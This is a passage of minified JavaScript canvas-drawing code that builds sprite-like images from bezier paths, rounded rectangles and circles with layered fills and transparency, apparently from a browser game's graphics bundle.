      n.bezierCurveTo(e * 169.048583984375, e * 17.6805419921875, e * 194.048583984375, e * 20.6805419921875, e * 210.048583984375, e * 27.6805419921875);
      n.bezierCurveTo(e * 234.048583984375, e * 40.6805419921875, e * 225.048583984375, e * 57.6805419921875, e * 186.048583984375, e * 61.6805419921875);
      n.closePath();
      ye(n, t[0], t[0], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 224.048583984375, e * 56.6805419921875);
      n.bezierCurveTo(e * 326.048583984375, e * 69.6805419921875, e * 363.048583984375, e * 148.6805419921875, e * 349.048583984375, e * 206.6805419921875);
      n.bezierCurveTo(e * 329.048583984375, e * 278.6805419921875, e * 252.048583984375, e * 283.6805419921875, e * 206.048583984375, e * 275.6805419921875);
      n.bezierCurveTo(e * 206.548583984375, e * 266.6805419921875, e * 206.548583984375, e * 266.6805419921875, e * 207.048583984375, e * 257.6805419921875);
      n.bezierCurveTo(e * 276.048583984375, e * 268.6805419921875, e * 308.048583984375, e * 239.6805419921875, e * 323.048583984375, e * 208.6805419921875);
      n.bezierCurveTo(e * 352.048583984375, e * 145.6805419921875, e * 292.048583984375, e * 86.6805419921875, e * 223.048583984375, e * 74.6805419921875);
      n.closePath();
      ye(n, t[0], t[0], e * 6);
      n.save();
      n.translate(e * 183.548583984375, e * 119.6805419921875);
      Be(n, e * -121.5, e * -45, e * 243, e * 90, e * 40);
      n.restore();
      ye(n, t[0], t[0], e * 6);
      n.save();
      n.translate(e * 183.048583984375, e * 155.6805419921875);
      Be(n, e * -121, e * -52, e * 242, e * 104, e * 40);
      n.restore();
      ye(n, t[0], t[0], e * 6);
      n.save();
      n.translate(e * 183.048583984375, e * 205.1805419921875);
      Be(n, e * -121, e * -50.5, e * 242, e * 101, e * 40);
      n.restore();
      ye(n, t[0], t[0], e * 6);
      n.save();
      n.translate(e * 185.048583984375, e * 204.1805419921875);
      Be(n, e * -100, e * -34.5, e * 200, e * 69, e * 40);
      n.restore();
      ye(n, t[0], t[0], e * 6);
      ze(n, e * 185.048583984375, e * 257.6805419921875, e * 27.018512172212592);
      ye(n, t[0], t[0], e * 6);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 224.048583984375, e * 56.6805419921875);
      n.bezierCurveTo(e * 326.048583984375, e * 69.6805419921875, e * 363.048583984375, e * 148.6805419921875, e * 349.048583984375, e * 206.6805419921875);
      n.bezierCurveTo(e * 329.048583984375, e * 278.6805419921875, e * 252.048583984375, e * 283.6805419921875, e * 206.048583984375, e * 275.6805419921875);
      n.bezierCurveTo(e * 206.548583984375, e * 266.6805419921875, e * 206.548583984375, e * 266.6805419921875, e * 207.048583984375, e * 257.6805419921875);
      n.bezierCurveTo(e * 276.048583984375, e * 268.6805419921875, e * 308.048583984375, e * 239.6805419921875, e * 323.048583984375, e * 208.6805419921875);
      n.bezierCurveTo(e * 352.048583984375, e * 145.6805419921875, e * 292.048583984375, e * 86.6805419921875, e * 223.048583984375, e * 74.6805419921875);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.save();
      n.translate(e * 184.048583984375, e * 69.1805419921875);
      Be(n, e * -40, e * -28.5, e * 80, e * 57, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 185.048583984375, e * 61.6805419921875);
      n.bezierCurveTo(e * 145.048583984375, e * 59.6805419921875, e * 138.048583984375, e * 41.6805419921875, e * 148.048583984375, e * 33.6805419921875);
      n.bezierCurveTo(e * 169.048583984375, e * 17.6805419921875, e * 194.048583984375, e * 20.6805419921875, e * 210.048583984375, e * 27.6805419921875);
      n.bezierCurveTo(e * 234.048583984375, e * 40.6805419921875, e * 225.048583984375, e * 57.6805419921875, e * 186.048583984375, e * 61.6805419921875);
      n.closePath();
      ye(n, t[1], t[2], e * 6);
      n.save();
      n.translate(e * 183.548583984375, e * 119.6805419921875);
      Be(n, e * -121.5, e * -45, e * 243, e * 90, e * 40);
      n.restore();
      ye(n, t[5], t[4], e * 6);
      n.save();
      n.translate(e * 183.048583984375, e * 155.6805419921875);
      Be(n, e * -121, e * -52, e * 242, e * 104, e * 40);
      n.restore();
      ye(n, t[3], t[4], e * 6);
      n.save();
      n.translate(e * 183.048583984375, e * 205.1805419921875);
      Be(n, e * -121, e * -50.5, e * 242, e * 101, e * 40);
      n.restore();
      ye(n, t[6], t[4], e * 6);
      n.globalCompositeOperation = "destination-out";
      n.save();
      n.translate(e * 185.048583984375, e * 204.1805419921875);
      Be(n, e * -100, e * -34.5, e * 200, e * 69, e * 40);
      n.restore();
      ye(n, t[7], t[8], e * 6);
      n.globalCompositeOperation = "source-over";
      n.globalAlpha = 0.5;
      n.save();
      n.translate(e * 185.048583984375, e * 204.1805419921875);
      Be(n, e * -100, e * -34.5, e * 200, e * 69, e * 40);
      n.restore();
      ye(n, t[7], t[8], e * 6);
      n.globalAlpha = 1;
      n.save();
      ze(n, e * 185.048583984375, e * 257.6805419921875, e * 27.018512172212592);
      ye(n, t[3], t[4], e * 6);
      n.restore();
      return r;
    }
    function _t(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 220;
      r.height = e * 180;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * -90, e * -150);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 104, e * 237.8000030517578);
      n.bezierCurveTo(e * 110, e * 237.8000030517578, e * 110, e * 237.8000030517578, e * 116, e * 237.8000030517578);
      n.bezierCurveTo(e * 116, e * 241.8000030517578, e * 116, e * 241.8000030517578, e * 116, e * 245.8000030517578);
      n.bezierCurveTo(e * 115, e * 245.3000030517578, e * 115, e * 245.3000030517578, e * 114, e * 244.8000030517578);
      n.bezierCurveTo(e * 109.5, e * 244.8000030517578, e * 109.5, e * 244.8000030517578, e * 105, e * 244.8000030517578);
      n.closePath();
      ye(n, t[5], t[5], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 211.20000457763672);
      n.bezierCurveTo(e * 106, e * 216.20000457763672, e * 101, e * 234.20000457763672, e * 102, e * 241.20000457763672);
      n.bezierCurveTo(e * 102, e * 260.2000045776367, e * 115, e * 269.2000045776367, e * 115, e * 269.2000045776367);
      n.bezierCurveTo(e * 116, e * 265.2000045776367, e * 115.5, e * 265.2000045776367, e * 116, e * 261.2000045776367);
      n.bezierCurveTo(e * 112, e * 264, e * 108, e * 254, e * 106, e * 242);
      n.bezierCurveTo(e * 105, e * 232, e * 110, e * 222, e * 115, e * 218);
      n.bezierCurveTo(e * 116, e * 216.75, e * 115.5, e * 217.375, e * 116, e * 216.75);
      n.closePath();
      ye(n, t[5], t[5], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 120, e * 207);
      n.bezierCurveTo(e * 115, e * 206, e * 114, e * 209, e * 114, e * 211);
      n.bezierCurveTo(e * 114, e * 268, e * 114, e * 241, e * 114, e * 271);
      n.bezierCurveTo(e * 115, e * 276, e * 118, e * 276, e * 120, e * 276);
      n.bezierCurveTo(e * 122, e * 273, e * 120.5, e * 274.5, e * 121, e * 273);
      n.bezierCurveTo(e * 121, e * 241, e * 121, e * 241, e * 121, e * 209);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 284, e * 238);
      n.bezierCurveTo(e * 289.5, e * 238, e * 289.5, e * 238, e * 295, e * 238);
      n.bezierCurveTo(e * 295, e * 241.5, e * 295, e * 241.5, e * 295, e * 245);
      n.bezierCurveTo(e * 289.5, e * 245, e * 289.5, e * 245, e * 284, e * 245);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 283, e * 211);
      n.bezierCurveTo(e * 293, e * 216, e * 297, e * 231, e * 297, e * 241);
      n.bezierCurveTo(e * 298, e * 254, e * 290, e * 265, e * 284, e * 269);
      n.bezierCurveTo(e * 283, e * 266, e * 283.5, e * 266, e * 283, e * 263);
      n.bezierCurveTo(e * 290, e * 260, e * 292, e * 251, e * 293, e * 242);
      n.bezierCurveTo(e * 292, e * 223, e * 289, e * 224, e * 284, e * 218);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 280, e * 206);
      n.bezierCurveTo(e * 284, e * 206, e * 285, e * 208, e * 285, e * 211);
      n.bezierCurveTo(e * 285, e * 241.5, e * 285, e * 241.5, e * 285, e * 272);
      n.bezierCurveTo(e * 284, e * 275, e * 284, e * 275, e * 280, e * 275);
      n.bezierCurveTo(e * 279, e * 273.5, e * 279, e * 273.5, e * 278, e * 272);
      n.bezierCurveTo(e * 278, e * 240.5, e * 278, e * 240.5, e * 278, e * 209);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 138, e * 298.40000915527344);
      n.bezierCurveTo(e * 141, e * 311.40000915527344, e * 151, e * 314.40000915527344, e * 162, e * 316.40000915527344);
      n.bezierCurveTo(e * 224, e * 316.40000915527344, e * 200, e * 315.90000915527344, e * 238, e * 315.40000915527344);
      n.bezierCurveTo(e * 254, e * 316.40000915527344, e * 261, e * 306.40000915527344, e * 264, e * 298.40000915527344);
      n.bezierCurveTo(e * 255, e * 304.40000915527344, e * 250, e * 306.40000915527344, e * 244, e * 306.40000915527344);
      n.bezierCurveTo(e * 201, e * 306.90000915527344, e * 201, e * 306.90000915527344, e * 158, e * 307.40000915527344);
      n.bezierCurveTo(e * 150, e * 306.40000915527344, e * 148, e * 306.40000915527344, e * 139, e * 300.40000915527344);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 177.5999984741211);
      n.bezierCurveTo(e * 130, e * 175.5999984741211, e * 123, e * 190.5999984741211, e * 122, e * 205.5999984741211);
      n.bezierCurveTo(e * 121, e * 277.5999984741211, e * 122, e * 242.5999984741211, e * 122, e * 279.5999984741211);
      n.bezierCurveTo(e * 128, e * 297.5999984741211, e * 137, e * 299.5999984741211, e * 143, e * 300.5999984741211);
      n.bezierCurveTo(e * 163, e * 301.0999984741211, e * 163, e * 301.0999984741211, e * 183, e * 301.5999984741211);
      n.bezierCurveTo(e * 150, e * 300.5999984741211, e * 135, e * 290.5999984741211, e * 134, e * 267.5999984741211);
      n.bezierCurveTo(e * 133, e * 245.5999984741211, e * 146, e * 235.5999984741211, e * 164, e * 235.5999984741211);
      n.bezierCurveTo(e * 206, e * 236.0999984741211, e * 206, e * 236.0999984741211, e * 248, e * 236.5999984741211);
      n.bezierCurveTo(e * 266, e * 243.5999984741211, e * 268, e * 259.5999984741211, e * 267, e * 266.5999984741211);
      n.bezierCurveTo(e * 266, e * 288.5999984741211, e * 251, e * 294.5999984741211, e * 244, e * 297.5999984741211);
      n.bezierCurveTo(e * 228.5, e * 299.5999984741211, e * 228.5, e * 299.5999984741211, e * 213, e * 301.5999984741211);
      n.bezierCurveTo(e * 236, e * 301.0999984741211, e * 236, e * 301.0999984741211, e * 259, e * 300.5999984741211);
      n.bezierCurveTo(e * 272, e * 295.5999984741211, e * 277, e * 288.5999984741211, e * 278, e * 271.5999984741211);
      n.bezierCurveTo(e * 277.5, e * 236.5999984741211, e * 277.5, e * 236.5999984741211, e * 277, e * 201.5999984741211);
      n.bezierCurveTo(e * 276, e * 186.5999984741211, e * 265, e * 178.5999984741211, e * 254, e * 177.5999984741211);
      n.bezierCurveTo(e * 247.5, e * 177.5999984741211, e * 247.5, e * 177.5999984741211, e * 241, e * 177.5999984741211);
      n.bezierCurveTo(e * 255, e * 202.5999984741211, e * 214, e * 217.5999984741211, e * 201, e * 215.5999984741211);
      n.bezierCurveTo(e * 170, e * 215.5999984741211, e * 152, e * 197.5999984741211, e * 161, e * 178.5999984741211);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 175.5999984741211);
      n.bezierCurveTo(e * 153, e * 176.0999984741211, e * 153, e * 176.0999984741211, e * 144, e * 176.5999984741211);
      n.bezierCurveTo(e * 125, e * 178.5999984741211, e * 121, e * 196.5999984741211, e * 121, e * 207.5999984741211);
      n.bezierCurveTo(e * 121, e * 243.20000076293945, e * 121, e * 243.20000076293945, e * 121, e * 278.8000030517578);
      n.bezierCurveTo(e * 126, e * 298.8000030517578, e * 137, e * 300.8000030517578, e * 146, e * 302.8000030517578);
      n.bezierCurveTo(e * 200.5, e * 302.8000030517578, e * 200.5, e * 302.8000030517578, e * 255, e * 302.8000030517578);
      n.bezierCurveTo(e * 271, e * 301.8000030517578, e * 279, e * 288.8000030517578, e * 279, e * 273.8000030517578);
      n.bezierCurveTo(e * 279, e * 236.8000030517578, e * 279, e * 236.8000030517578, e * 279, e * 199.8000030517578);
      n.bezierCurveTo(e * 274, e * 178.8000030517578, e * 263, e * 177.8000030517578, e * 255, e * 175.8000030517578);
      n.bezierCurveTo(e * 248, e * 175.8000030517578, e * 248, e * 175.8000030517578, e * 241, e * 175.8000030517578);
      n.bezierCurveTo(e * 240, e * 175.8000030517578, e * 240, e * 175.8000030517578, e * 239, e * 175.8000030517578);
      n.bezierCurveTo(e * 254, e * 200.8000030517578, e * 222, e * 211.8000030517578, e * 202, e * 212.8000030517578);
      n.bezierCurveTo(e * 168, e * 213.8000030517578, e * 151, e * 190.8000030517578, e * 163, e * 176.8000030517578);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 198, e * 161.4000015258789);
      n.bezierCurveTo(e * 198, e * 186.9000015258789, e * 198, e * 186.9000015258789, e * 198, e * 212.4000015258789);
      n.bezierCurveTo(e * 201, e * 212.4000015258789, e * 201, e * 212.4000015258789, e * 204, e * 212.4000015258789);
      n.bezierCurveTo(e * 204, e * 186.9000015258789, e * 204, e * 186.9000015258789, e * 204, e * 161.4000015258789);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 194);
      n.bezierCurveTo(e * 188, e * 169, e * 231, e * 179, e * 241, e * 194);
      n.bezierCurveTo(e * 239.5, e * 196, e * 239.5, e * 196, e * 238, e * 198);
      n.bezierCurveTo(e * 221, e * 179, e * 182, e * 182, e * 165, e * 198);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157, e * 188.80000019073486);
      n.bezierCurveTo(e * 162, e * 150.80000019073486, e * 241, e * 150.80000019073486, e * 245, e * 188.80000019073486);
      n.bezierCurveTo(e * 242, e * 224.80000019073486, e * 162, e * 228.80000019073486, e * 157, e * 188.80000019073486);
      n.bezierCurveTo(e * 159, e * 188.80000019073486, e * 159, e * 188.80000019073486, e * 161, e * 188.80000019073486);
      n.bezierCurveTo(e * 168, e * 216.80000019073486, e * 231, e * 218.80000019073486, e * 241, e * 188.80000019073486);
      n.bezierCurveTo(e * 236, e * 156.80000019073486, e * 169, e * 152.80000019073486, e * 161, e * 188.80000019073486);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 156, e * 188);
      n.bezierCurveTo(e * 160, e * 164, e * 183, e * 159, e * 201, e * 158);
      n.bezierCurveTo(e * 232, e * 159, e * 244, e * 174, e * 246, e * 188);
      n.bezierCurveTo(e * 245, e * 212, e * 213, e * 219, e * 201, e * 218);
      n.bezierCurveTo(e * 181, e * 221, e * 158, e * 207, e * 156, e * 190);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 189);
      n.bezierCurveTo(e * 166, e * 170, e * 185, e * 165, e * 201, e * 164);
      n.bezierCurveTo(e * 227, e * 165, e * 240, e * 178, e * 239, e * 188);
      n.bezierCurveTo(e * 239, e * 204, e * 210, e * 210, e * 201, e * 210);
      n.bezierCurveTo(e * 182, e * 211, e * 166, e * 200, e * 162, e * 190);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131, e * 262);
      n.bezierCurveTo(e * 136, e * 241, e * 144, e * 236, e * 158, e * 233);
      n.bezierCurveTo(e * 200.5, e * 233, e * 229, e * 232, e * 243, e * 233);
      n.bezierCurveTo(e * 259, e * 235, e * 267, e * 248, e * 269, e * 260);
      n.bezierCurveTo(e * 269, e * 266.5, e * 269, e * 266.5, e * 269, e * 273);
      n.bezierCurveTo(e * 265, e * 290, e * 251, e * 297, e * 242, e * 298);
      n.bezierCurveTo(e * 202, e * 298, e * 202, e * 298, e * 162, e * 298);
      n.bezierCurveTo(e * 148, e * 298, e * 136, e * 289, e * 132, e * 273);
      n.bezierCurveTo(e * 131.5, e * 268, e * 131.5, e * 268, e * 131, e * 263);
      n.bezierCurveTo(e * 135, e * 263, e * 135, e * 263, e * 139, e * 263);
      n.bezierCurveTo(e * 139, e * 281, e * 151, e * 287, e * 160, e * 290);
      n.bezierCurveTo(e * 200.5, e * 290, e * 200.5, e * 290, e * 241, e * 290);
      n.bezierCurveTo(e * 252, e * 290, e * 257, e * 281, e * 262, e * 271);
      n.bezierCurveTo(e * 261.5, e * 267, e * 261.5, e * 267, e * 261, e * 263);
      n.bezierCurveTo(e * 260, e * 249, e * 251, e * 242, e * 241, e * 241);
      n.bezierCurveTo(e * 240.5, e * 240.5, e * 240.5, e * 240.5, e * 240, e * 240);
      n.bezierCurveTo(e * 200, e * 240, e * 200, e * 240, e * 160, e * 240);
      n.bezierCurveTo(e * 145, e * 244, e * 142, e * 250, e * 139, e * 264);
      n.closePath();
      ye(n, t[4], t[4], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130, e * 264);
      n.bezierCurveTo(e * 132, e * 244, e * 144, e * 235, e * 157, e * 232);
      n.bezierCurveTo(e * 245, e * 232, e * 201, e * 232, e * 245, e * 232);
      n.bezierCurveTo(e * 264, e * 235, e * 269, e * 251, e * 270, e * 264);
      n.bezierCurveTo(e * 272, e * 291, e * 248, e * 299, e * 242, e * 299);
      n.bezierCurveTo(e * 200, e * 299, e * 200, e * 299, e * 158, e * 299);
      n.bezierCurveTo(e * 139, e * 298, e * 130, e * 276, e * 130, e * 265);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 140, e * 265.33333587646484);
      n.bezierCurveTo(e * 141, e * 250.33333587646484, e * 148, e * 244.33333587646484, e * 160, e * 241.33333587646484);
      n.bezierCurveTo(e * 200, e * 241.33333587646484, e * 200, e * 241.33333587646484, e * 240, e * 241.33333587646484);
      n.bezierCurveTo(e * 256, e * 243.33333587646484, e * 260, e * 255.33333587646484, e * 260, e * 265.33333587646484);
      n.bezierCurveTo(e * 261, e * 281.33333587646484, e * 247, e * 289.33333587646484, e * 240, e * 289.33333587646484);
      n.bezierCurveTo(e * 161, e * 289.33333587646484, e * 200.5, e * 289.33333587646484, e * 161, e * 289.33333587646484);
      n.bezierCurveTo(e * 149, e * 288.33333587646484, e * 142, e * 278.33333587646484, e * 140, e * 266.33333587646484);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.globalAlpha = 0.5;
      n.scale(1, 1);
      n.translate(e * 105, e * 155);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59.27557373046875, e * 20.406280517578125);
      n.bezierCurveTo(e * 74.27557373046875, e * 5.406280517578125, e * 90.27557373046875, e * 6.406280517578125, e * 99.27557373046875, e * 5.406280517578125);
      n.bezierCurveTo(e * 120.27557373046875, e * 5.406280517578125, e * 126.27557373046875, e * 10.406280517578125, e * 136.27557373046875, e * 20.406280517578125);
      n.bezierCurveTo(e * 157.77557373046875, e * 37.906280517578125, e * 157.77557373046875, e * 37.906280517578125, e * 179.27557373046875, e * 55.406280517578125);
      n.bezierCurveTo(e * 190.27557373046875, e * 63.406280517578125, e * 192.27557373046875, e * 77.40628051757812, e * 189.27557373046875, e * 91.40628051757812);
      n.bezierCurveTo(e * 183.27557373046875, e * 108.40628051757812, e * 176.27557373046875, e * 110.40628051757812, e * 169.27557373046875, e * 118.40628051757812);
      n.bezierCurveTo(e * 152.27557373046875, e * 133.40628051757812, e * 152.27557373046875, e * 133.40628051757812, e * 135.27557373046875, e * 148.40628051757812);
      n.bezierCurveTo(e * 87.27557373046875, e * 143.40628051757812, e * 87.27557373046875, e * 143.40628051757812, e * 39.27557373046875, e * 138.40628051757812);
      n.bezierCurveTo(e * 26.77557373046875, e * 123.40628051757812, e * 26.77557373046875, e * 123.40628051757812, e * 14.27557373046875, e * 108.40628051757812);
      n.bezierCurveTo(e * 2.27557373046875, e * 95.40628051757812, e * 2.27557373046875, e * 92.40628051757812, e * 3.27557373046875, e * 83.40628051757812);
      n.bezierCurveTo(e * 4.27557373046875, e * 63.406280517578125, e * 12.27557373046875, e * 60.406280517578125, e * 24.27557373046875, e * 40.406280517578125);
      n.closePath();
      ye(n, t[5], t[5], e * 4);
      n.globalAlpha = 1;
      n.translate(e * -110, e * -155);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 104, e * 237.8000030517578);
      n.bezierCurveTo(e * 110, e * 237.8000030517578, e * 110, e * 237.8000030517578, e * 116, e * 237.8000030517578);
      n.bezierCurveTo(e * 116, e * 241.8000030517578, e * 116, e * 241.8000030517578, e * 116, e * 245.8000030517578);
      n.bezierCurveTo(e * 115, e * 245.3000030517578, e * 115, e * 245.3000030517578, e * 114, e * 244.8000030517578);
      n.bezierCurveTo(e * 109.5, e * 244.8000030517578, e * 109.5, e * 244.8000030517578, e * 105, e * 244.8000030517578);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 211.20000457763672);
      n.bezierCurveTo(e * 106, e * 216.20000457763672, e * 101, e * 234.20000457763672, e * 102, e * 241.20000457763672);
      n.bezierCurveTo(e * 102, e * 260.2000045776367, e * 115, e * 269.2000045776367, e * 115, e * 269.2000045776367);
      n.bezierCurveTo(e * 116, e * 265.2000045776367, e * 115.5, e * 265.2000045776367, e * 116, e * 261.2000045776367);
      n.bezierCurveTo(e * 112, e * 264, e * 108, e * 254, e * 106, e * 242);
      n.bezierCurveTo(e * 105, e * 232, e * 110, e * 222, e * 115, e * 218);
      n.bezierCurveTo(e * 116, e * 216.75, e * 115.5, e * 217.375, e * 116, e * 216.75);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 120, e * 207);
      n.bezierCurveTo(e * 115, e * 206, e * 114, e * 209, e * 114, e * 211);
      n.bezierCurveTo(e * 114, e * 268, e * 114, e * 241, e * 114, e * 271);
      n.bezierCurveTo(e * 115, e * 276, e * 118, e * 276, e * 120, e * 276);
      n.bezierCurveTo(e * 122, e * 273, e * 120.5, e * 274.5, e * 121, e * 273);
      n.bezierCurveTo(e * 121, e * 241, e * 121, e * 241, e * 121, e * 209);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 284, e * 238);
      n.bezierCurveTo(e * 289.5, e * 238, e * 289.5, e * 238, e * 295, e * 238);
      n.bezierCurveTo(e * 295, e * 241.5, e * 295, e * 241.5, e * 295, e * 245);
      n.bezierCurveTo(e * 289.5, e * 245, e * 289.5, e * 245, e * 284, e * 245);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 283, e * 211);
      n.bezierCurveTo(e * 293, e * 216, e * 297, e * 231, e * 297, e * 241);
      n.bezierCurveTo(e * 298, e * 254, e * 290, e * 265, e * 284, e * 269);
      n.bezierCurveTo(e * 283, e * 266, e * 283.5, e * 266, e * 283, e * 263);
      n.bezierCurveTo(e * 290, e * 260, e * 292, e * 251, e * 293, e * 242);
      n.bezierCurveTo(e * 292, e * 223, e * 289, e * 224, e * 284, e * 218);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 280, e * 206);
      n.bezierCurveTo(e * 284, e * 206, e * 285, e * 208, e * 285, e * 211);
      n.bezierCurveTo(e * 285, e * 241.5, e * 285, e * 241.5, e * 285, e * 272);
      n.bezierCurveTo(e * 284, e * 275, e * 284, e * 275, e * 280, e * 275);
      n.bezierCurveTo(e * 279, e * 273.5, e * 279, e * 273.5, e * 278, e * 272);
      n.bezierCurveTo(e * 278, e * 240.5, e * 278, e * 240.5, e * 278, e * 209);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 138, e * 298.40000915527344);
      n.bezierCurveTo(e * 141, e * 311.40000915527344, e * 151, e * 314.40000915527344, e * 162, e * 316.40000915527344);
      n.bezierCurveTo(e * 224, e * 316.40000915527344, e * 200, e * 315.90000915527344, e * 238, e * 315.40000915527344);
      n.bezierCurveTo(e * 254, e * 316.40000915527344, e * 261, e * 306.40000915527344, e * 264, e * 298.40000915527344);
      n.bezierCurveTo(e * 255, e * 304.40000915527344, e * 250, e * 306.40000915527344, e * 244, e * 306.40000915527344);
      n.bezierCurveTo(e * 201, e * 306.90000915527344, e * 201, e * 306.90000915527344, e * 158, e * 307.40000915527344);
      n.bezierCurveTo(e * 150, e * 306.40000915527344, e * 148, e * 306.40000915527344, e * 139, e * 300.40000915527344);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 177.5999984741211);
      n.bezierCurveTo(e * 130, e * 175.5999984741211, e * 123, e * 190.5999984741211, e * 122, e * 205.5999984741211);
      n.bezierCurveTo(e * 121, e * 277.5999984741211, e * 122, e * 242.5999984741211, e * 122, e * 279.5999984741211);
      n.bezierCurveTo(e * 128, e * 297.5999984741211, e * 137, e * 299.5999984741211, e * 143, e * 300.5999984741211);
      n.bezierCurveTo(e * 163, e * 301.0999984741211, e * 163, e * 301.0999984741211, e * 183, e * 301.5999984741211);
      n.bezierCurveTo(e * 150, e * 300.5999984741211, e * 135, e * 290.5999984741211, e * 134, e * 267.5999984741211);
      n.bezierCurveTo(e * 133, e * 245.5999984741211, e * 146, e * 235.5999984741211, e * 164, e * 235.5999984741211);
      n.bezierCurveTo(e * 206, e * 236.0999984741211, e * 206, e * 236.0999984741211, e * 248, e * 236.5999984741211);
      n.bezierCurveTo(e * 266, e * 243.5999984741211, e * 268, e * 259.5999984741211, e * 267, e * 266.5999984741211);
      n.bezierCurveTo(e * 266, e * 288.5999984741211, e * 251, e * 294.5999984741211, e * 244, e * 297.5999984741211);
      n.bezierCurveTo(e * 228.5, e * 299.5999984741211, e * 228.5, e * 299.5999984741211, e * 213, e * 301.5999984741211);
      n.bezierCurveTo(e * 236, e * 301.0999984741211, e * 236, e * 301.0999984741211, e * 259, e * 300.5999984741211);
      n.bezierCurveTo(e * 272, e * 295.5999984741211, e * 277, e * 288.5999984741211, e * 278, e * 271.5999984741211);
      n.bezierCurveTo(e * 277.5, e * 236.5999984741211, e * 277.5, e * 236.5999984741211, e * 277, e * 201.5999984741211);
      n.bezierCurveTo(e * 276, e * 186.5999984741211, e * 265, e * 178.5999984741211, e * 254, e * 177.5999984741211);
      n.bezierCurveTo(e * 247.5, e * 177.5999984741211, e * 247.5, e * 177.5999984741211, e * 241, e * 177.5999984741211);
      n.bezierCurveTo(e * 255, e * 202.5999984741211, e * 214, e * 217.5999984741211, e * 201, e * 215.5999984741211);
      n.bezierCurveTo(e * 170, e * 215.5999984741211, e * 152, e * 197.5999984741211, e * 161, e * 178.5999984741211);
      n.closePath();
      ye(n, t[2], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 175.5999984741211);
      n.bezierCurveTo(e * 153, e * 176.0999984741211, e * 153, e * 176.0999984741211, e * 144, e * 176.5999984741211);
      n.bezierCurveTo(e * 125, e * 178.5999984741211, e * 121, e * 196.5999984741211, e * 121, e * 207.5999984741211);
      n.bezierCurveTo(e * 121, e * 243.20000076293945, e * 121, e * 243.20000076293945, e * 121, e * 278.8000030517578);
      n.bezierCurveTo(e * 126, e * 298.8000030517578, e * 137, e * 300.8000030517578, e * 146, e * 302.8000030517578);
      n.bezierCurveTo(e * 200.5, e * 302.8000030517578, e * 200.5, e * 302.8000030517578, e * 255, e * 302.8000030517578);
      n.bezierCurveTo(e * 271, e * 301.8000030517578, e * 279, e * 288.8000030517578, e * 279, e * 273.8000030517578);
      n.bezierCurveTo(e * 279, e * 236.8000030517578, e * 279, e * 236.8000030517578, e * 279, e * 199.8000030517578);
